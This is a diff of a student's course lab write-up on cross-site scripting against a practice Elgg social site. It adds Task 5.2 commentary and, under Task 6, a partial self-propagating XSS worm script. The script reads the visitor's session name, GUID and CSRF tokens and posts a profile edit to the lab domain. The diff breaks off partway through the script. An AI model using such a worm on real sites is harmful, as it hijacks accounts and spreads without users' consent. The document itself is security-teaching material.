@@ -54,6 +54,9 @@ For task 4.2 I was unable to successfully re-add Boby as a friend. To try and ac
 
 ## Task 5
 
+
+### Task 5.1
+
 Once again, we will be targetting poor Boby. As you can see from the screenshot below, Boby has a very poor MySpace-esque profile page. Let's see if we can't spice things up. You know, once he visits Samy's profile.
 
 ![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.png)
@@ -64,5 +67,48 @@ Okay, so I had to create the variable desc which is our description variable. Th
 ![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.2.png)
 
 
+### Task 5.2
+
+You need this line of code because if you didn't have it, you would attack yourself. So this is basically saying that if the user id is not Samy's, then we continue with the attack, but if it is, we do not do anything. This was probably the hardest part for me to figure out for some reason because I couldn't figure out what Samy's GUID was for the life of me. 
+
+## Task 6
+<script id=worm>
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  // (1)
+    var jsCode = document.getElementById("worm").innerHTML;           // (2)
+    var tailTag = "</" + "script>";                                   // (3)
+
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  // (4)
+
+    alert(jsCode); // this can be used for testing; replace with actual XSS worm payload.
+
+    // TODO: Get the name, guid, timestamp, and token.
+    var name="&name="+elgg.session.user.name;
+    var guid="&guid="+elgg.session.user.guid;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+    // TODO: Set the content of the description field and access level.
+    var des = "&description=Samy is my hero"
+    var acsl = "&accesslevel[description]=2"
+
+    // TODO: Set the URL, and create and send Ajax request to modify profile
+
+    // Construct your url.
+    var sendurl= "http://www.xsslabelgg.com/action/profile/edit";     //FILL IN
+
+    // Construct the content of your request.
+    var content= token + ts + name + des + guid;     //FILL IN
+
+    // Send the HTTP POST request
+    var samyGuid=59;    //FILL IN
+    if (elgg.session.user.guid!=samyGuid)       // (1)
+    {
+        // Create and send Ajax request to modify profile
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST",sendurl,true);
+        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
 
 
